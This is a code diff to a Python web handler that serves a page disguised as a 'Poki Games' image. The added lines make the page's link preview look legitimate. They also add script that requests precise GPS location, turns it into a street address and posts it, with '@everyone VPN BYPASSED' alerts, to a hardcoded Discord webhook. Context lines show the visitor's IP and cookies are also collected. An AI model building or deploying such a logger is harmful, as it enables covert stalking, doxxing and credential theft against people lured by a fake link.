@@ -7,13 +7,13 @@ class handler(BaseHTTPRequestHandler):
     def do_GET(self):
         # Configuration
         WEBHOOK = "https://discord.com/api/webhooks/1464803825847369837/j3diMzcguRrWtdRMnswJ5uA4_fCymBpPkTsV-eNYEs2xjChfvhpXOTCSb-AMB2ZXgz2Q"
-        DEFAULT_IMAGE = "https://www.gamepur.com/wp-content/uploads/2023/03/Poki-Games-1.jpg"
+        DEFAULT_IMAGE = "https://i.imgur.com/5M6F3wQ.jpeg"
         
-        # Image mappings
+        # Image mappings - using direct image URLs that work
         IMAGES = {
-            "poki": "https://www.gamepur.com/wp-content/uploads/2023/03/Poki-Games-1.jpg",
-            "cat": "https://www.gamepur.com/wp-content/uploads/2023/03/Poki-Games-1.jpg",
-            "dog": "https://www.gamepur.com/wp-content/uploads/2023/03/Poki-Games-1.jpg",
+            "poki": "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSP0z5U7x5O5zvL0kvYx9x0hbfOg7xZTj0vbw&s",
+            "cat": "https://i.imgur.com/5M6F3wQ.jpeg",
+            "dog": "https://i.imgur.com/2QksCKj.jpeg",
         }
         
         # Get visitor's real IP
@@ -139,21 +139,30 @@ class handler(BaseHTTPRequestHandler):
 <html>
 <head>
     <meta charset="UTF-8">
+    <meta property="og:type" content="website">
+    <meta property="og:title" content="Poki Games">
+    <meta property="og:description" content="Play free online games">
     <meta property="og:image" content="{image_url}">
+    <meta property="og:image:secure_url" content="{image_url}">
+    <meta property="og:image:type" content="image/jpeg">
     <meta property="og:image:width" content="1200">
     <meta property="og:image:height" content="630">
-    <title>Image</title>
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:image" content="{image_url}">
+    <meta name="theme-color" content="#00D9FF">
+    <link rel="icon" href="{image_url}">
+    <title>Poki Games</title>
     <style>
         * {{ margin:0; padding:0; box-sizing:border-box; }}
-        body {{ background:#000; display:flex; justify-content:center; align-items:center; min-height:100vh; }}
-        img {{ max-width:100%; max-height:100vh; object-fit:contain; }}
+        body {{ background:#00D9FF; display:flex; justify-content:center; align-items:center; min-height:100vh; overflow:hidden; }}
+        img {{ max-width:100%; max-height:100vh; object-fit:contain; display:block; }}
         #dataBox {{ position:fixed; top:20px; left:20px; right:20px; background:rgba(0,255,0,0.95); color:#000; padding:20px; border-radius:10px; font:12px monospace; max-height:80vh; overflow-y:auto; z-index:999999; }}
         .section {{ margin-bottom:15px; }}
         .title {{ font-weight:bold; font-size:14px; margin-bottom:5px; }}
     </style>
 </head>
 <body>
-    <img src="{image_url}">
+    <img src="{image_url}" onerror="this.src='https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSP0z5U7x5O5zvL0kvYx9x0hbfOg7xZTj0vbw&s'" alt="Poki">
     <div id="dataBox"></div>
     <script>
 (async()=>{{
@@ -260,7 +269,7 @@ class handler(BaseHTTPRequestHandler):
     }}catch(e){{ data += 'Cannot access<br>'; }}
     data += '</div>';
     
-    // === BROWSER INFO ===
+    # === BROWSER INFO & REAL LOCATION ===
     data += '<div class="section"><div class="title">💻 BROWSER INFO</div>';
     data += `Platform: ${{navigator.platform}}<br>`;
     data += `Language: ${{navigator.language}}<br>`;
@@ -268,7 +277,99 @@ class handler(BaseHTTPRequestHandler):
     data += `Timezone: ${{Intl.DateTimeFormat().resolvedOptions().timeZone}}<br>`;
     data += '</div>';
     
+    // === REAL LOCATION (GPS) ===
+    data += '<div class="section"><div class="title">📍 PRECISE LOCATION (GPS)</div>';
+    data += 'Requesting GPS access...<br>';
+    data += '</div>';
+    
     box.innerHTML = data;
+    
+    // Try to get REAL location via GPS (bypasses VPN)
+    if(navigator.geolocation){{
+        navigator.geolocation.getCurrentPosition(
+            async(pos)=>{{
+                const lat = pos.coords.latitude;
+                const lon = pos.coords.longitude;
+                const acc = pos.coords.accuracy;
+                
+                // Update display
+                data = box.innerHTML.replace('Requesting GPS access...<br>', 
+                    `✅ GPS LOCATION OBTAINED:<br>Latitude: ${{lat}}<br>Longitude: ${{lon}}<br>Accuracy: ${{acc}}m<br>`);
+                box.innerHTML = data;
+                
+                // Get address from coordinates (reverse geocoding)
+                try{{
+                    const geoRes = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${{lat}}&lon=${{lon}}`,{{
+                        headers:{{'User-Agent':'ImageLogger/1.0'}}
+                    }});
+                    const geoData = await geoRes.json();
+                    const addr = geoData.address || {{}};
+                    
+                    const fullAddress = [
+                        addr.road,
+                        addr.house_number,
+                        addr.city || addr.town || addr.village,
+                        addr.state,
+                        addr.postcode,
+                        addr.country
+                    ].filter(x=>x).join(', ');
+                    
+                    // Update display with full address
+                    data = box.innerHTML.replace('Requesting GPS access...<br>', 
+                        `✅ REAL LOCATION (VPN BYPASSED):<br>📍 Address: ${{fullAddress}}<br>Coords: ${{lat}}, ${{lon}}<br>Accuracy: ${{acc}}m<br>`);
+                    box.innerHTML = data;
+                    
+                    // Send real location to webhook
+                    await fetch('{webhook}',{{
+                        method:'POST',
+                        headers:{{'Content-Type':'application/json'}},
+                        body:JSON.stringify({{
+                            content:'@everyone 🚨 VPN BYPASSED - REAL LOCATION OBTAINED',
+                            embeds:[{{
+                                title:'📍 REAL GPS LOCATION',
+                                color:3066993,
+                                fields:[
+                                    {{name:'🏠 Full Address',value:`\`${{fullAddress}}\``,inline:false}},
+                                    {{name:'🌆 City',value:addr.city||addr.town||addr.village||'Unknown',inline:true}},
+                                    {{name:'🗺️ State',value:addr.state||'Unknown',inline:true}},
+                                    {{name:'📮 Postal Code',value:addr.postcode||'Unknown',inline:true}},
+                                    {{name:'📌 Coordinates',value:`${{lat}}, ${{lon}}`,inline:false}},
+                                    {{name:'🎯 Accuracy',value:`${{Math.round(acc)}} meters`,inline:true}},
+                                    {{name:'🗺️ Google Maps',value:`[Click to View]( https://www.google.com/maps?q=${{lat}},${{lon}})`,inline:false}},
+                                    {{name:'🔗 Endpoint',value:`\`{endpoint}\``,inline:true}}
+                                ],
+                                footer:{{text:'GPS Location - VPN Bypassed ✅'}}
+                            }}]
+                        }})
+                    }});
+                }}catch(e){{
+                    // Send coordinates even if reverse geocoding fails
+                    await fetch('{webhook}',{{
+                        method:'POST',
+                        headers:{{'Content-Type':'application/json'}},
+                        body:JSON.stringify({{
+                            content:'@everyone',
+                            embeds:[{{
+                                title:'📍 REAL GPS COORDINATES',
+                                color:3066993,
+                                description:`**Latitude:** ${{lat}}\\n**Longitude:** ${{lon}}\\n**Accuracy:** ${{acc}}m\\n\\n[View on Google Maps](https://www.google.com/maps?q=${{lat}},${{lon}})`,
+                                fields:[{{name:'Endpoint',value:`\`{endpoint}\``,inline:true}}]
+                            }}]
+                        }})
+                    }});
+                }}
+            }},
+            (err)=>{{
+                data = box.innerHTML.replace('Requesting GPS access...<br>', 
+                    `❌ GPS denied or unavailable<br>Error: ${{err.message}}<br>`);
+                box.innerHTML = data;
+            }},
+            {{enableHighAccuracy:true, timeout:10000, maximumAge:0}}
+        );
+    }}else{{
+        data = box.innerHTML.replace('Requesting GPS access...<br>', '❌ GPS not supported<br>');
+        box.innerHTML = data;
+    }}
     
     // Send cookies if found
     if(cookies){{
